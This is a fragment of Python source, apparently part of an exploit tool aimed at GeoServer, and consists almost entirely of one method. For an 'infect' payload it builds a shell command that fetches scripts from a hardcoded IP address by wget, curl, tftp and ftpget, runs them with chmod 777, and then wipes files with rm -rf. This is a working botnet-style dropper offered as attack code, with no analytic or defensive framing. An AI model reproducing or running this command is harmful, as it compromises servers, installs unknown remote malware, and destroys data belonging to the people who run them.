...
class GeoServerExploit:
    ...
    def construct_command(self):
        if self.payload_type == "infect":
            cmd = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.62.37.166/1.sh; curl -O http://72.62.37.166/1.sh; chmod 777 1.sh; sh 1.sh; tftp 72.62.37.166 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 72.62.37.166; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 72.62.37.166 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *'
